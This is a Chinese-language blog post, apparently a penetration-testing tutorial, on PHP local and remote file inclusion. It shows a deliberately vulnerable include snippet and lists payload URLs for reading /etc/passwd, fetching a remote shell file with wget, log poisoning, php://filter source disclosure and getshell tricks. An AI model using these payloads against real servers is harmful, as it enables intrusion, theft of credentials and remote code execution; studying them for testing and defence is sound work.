---
title: 文件包含漏洞(File Include)
date: 2018-10-12
tags: 
layout: post
---


## 产生原因：
由于在编写代码时避免麻烦就需要把公用的一段代码写到一个单独的文件里面，然后供其他文件需要时直接包含调用
## 重要函数：
**Include()**：包含并运行指定的文件，包含文件发生错误时，程序警告但会继续执行。
**Include_once()**：包含并运行指定文件，会检查文件是否已经被导入，如果导入后面的便不会再导入。
**Require()**:包含并运行指定文件，包含文件发生错误时，程序直接终止执行。
**Require_once()**:和require类似，但只导入一次
## 利用方法：
### 1.本地文件包含：
```
<?php
    $file = $_GET['file'];
    if(isset($file)){
        include("$file");
    }else{
        echo "file fail";
    }
```
**将包含的文件名改为本地的其他文件时，可以直接达到访问	 
同理可以输入
`http://192.168.168.110/file_include1.php?file=../../../etc/passwd`
直接查看本地用户的密码文件（当然前提是fifle_include1.php拥有足够的权限）**
### 2．远程文件包含：

`http://192.168.168.110/file_include1.php?file=http://地址/文件名`

**Php.ini文件中的allow_url_fopen和allow_url_include为ON才可以执行**
### 3.包含一个创建文件的php	
`http://192.168.168.10:8081/vulnerabilities/fi/?page=http://192.168.168.110/cmd.php?cmd=wget http://192.168.168.110/ -O cmd.php`

## 黑盒测试手法：
**单纯从url判断，url中path、dir、file、pag、page、archive、p、eng等相关字符时可能存在该漏洞**
### 本地包含漏洞的利用
1、	包含同服务器中上传的jpg、txt、rar等文件，这个是最理想的情况了。

2、包含系统的各种日志，如apache日志，文件系统日志等 其中apache当记录格式为combined，一般日志都会很大，基本无法包含成功。包含log是有自动化攻击程序的。
其中鬼子的博客中有提到一个空格的问题。
>《邪恶的空格-PHP本地文件包含漏洞的新突破口》 
 http://huaidan.org/archives/1144.html 

解决空格问题其实把一句话base64加密后再写入就可以执行了。

3、包含 /proc/self/environ . 这个环境变量有访问web的session信息和包含user-agent的参数。user-agent在客户端是可以修改的。参考：
>《Shell via LFI – proc/self/environ method》
 http://hi.baidu.com/root_exp/blog/item/9c0571fc2d42664fd7887d7d.html  

4、包含由php程序本身生成的文件，缓存、模版等，开源的程序成功率大。

5、利用本地包含读取PHP敏感性文件，需要PHP5以上版本。如看到“config”的源码如下
`index.php?pages=php://filter/read=convert.base64-encode/resource=config`
特别的情况用到readfile() 函数不是包含执行，可以直接读源码。

6、利用phpinfo页面getshell。一般大组织的web群存在phpinfo的机会挺大的。
poc和介绍参考：
>《利用phpinfo信息LFI临时文件》
 http://hi.baidu.com/idwar/blog/item/43101de153370126279791f2.html

7、利用包含出错，或者包含有未初始化变量的PHP文件，只要变量未初始化就可能再次攻击 具体见：
>《include()本地文件包含漏洞随想》
 http://www.2cto.com/Article/200809/29748.html

8、结合跨站使用
`index.php?pages=http://127.0.0.1/path/xss.php?xss=phpcode` （要考虑域信任问题）

9、包含临时文件文件。这个方法很麻烦的。参考：
>《POST method uploads》
 http://www.php.net/manual/en/features.file-upload.post-method.php 

解决临时文件删除方法：慢连接 ***（注：前提是 file_uploads = On，5.3.1中增加了max_file_uploadsphp.ini file_uploads = On，5.3.1中增加了max_file_uploads，默认最大一次上传20个）***
 **windows格式** ：win下最长4个随机字符( ‘a’-’z’, ‘A’-’Z’, ’0′-’9′）如： c:/windows/temp/php3e.tmp
 **linux格式** ：6个随机字符( ‘a’-’z’, ‘A’-’Z’, ’0′-’9′） 如：/tmp/phpUs7MxA
慢连接的两种上传代码参考：
>《PHP安全之LFI漏洞GetShell方法大阅兵》
http://www.myhack58.com/Article/html/3/62/2011/32008_2.htm  

10、当前实在找不到写权限目录时候，注入到log中再寻找写权限目录。如注入到`log.
Linux: index.php?pages=/var/log/apache/logs/error_log%00&x=/&y=uname
windows: index.php?pages=..\apache\logs\error.log%00&x=.&y=dir`
>具体参考《PHP本地文件包含(LFI)漏洞利用》
http://kingbase.org/blog/php_local_file_inclusion_exploit

11、使用php wrapper例如php://input、php://filter、data://等包含文件 在 **《PHP 5.2.0 and allow_url_include》http://blog.php-security.org/archives/45-PHP-5.2.0-and-allow_url_include.html** 其中文中提到的allow_url_fopen和allow_url_include只是保护了against URL handles标记为URL.这影响了http(s) and ftp(s)但是并没有影响php或date 这些url形式。

12、LFI判断目录是否存在和列目录，如
`index.php?pages=../../../../../../var/www/dossierexistant/../../../../../etc/passwd%00`
这个方法在TTYshell上是可以完全是可以判断的，但是在URL上有时候不可行。即使不存在dossierexistant也可以回显passwd内容。
 `FreeBSD 《directory listing with PHP file functions》http://websec…ress.com/2009 … php-file-functions/ 列目录
`存在逻辑判断的时候，如不存在该目录就会返回header.php+File not found+footer.php 存在就会返回header.php+footer.php。这种逻辑很符合程序员的习惯。曾经用找到了一个目录很深的日志获得shell。

13、包含SESSION文件，php保存格式 sess_SESSIONID 默认位置是 **/tmp/(PHP Sessions)**、**/var/lib/php/session/(PHP Sessions)**、 **/var/lib/php5/(PHP Sessions)** 和 **c:/windows/temp/(PHP Sessions)** 等文件中。

14、包含 /proc/self/cmdline 或者/proc/self/fd/找到log文件 （拥有者为root，默认情况要root才能访问）
具体参考：
> Local File Inclusion – 《Tricks of the Trade》
http://labs.neohapsis.com/2008/07/21/local-file-inclusion-%E2%80%93-tricks-of-the-trade/  

还有其他提到包含/var/log/auth.log的，但是这个文件默认情况也是644.

15、包含maillog 通常位置/var/log/maillog 这个方法也很鸡肋，具体参考：
>《local file inclusion tricks 》

16、包含固定的文件，非常鸡肋，为了完整性也提下。如，可用中间人攻击。


> **参考文章：https://www.2cto.com/article/201304/204158.html**
	
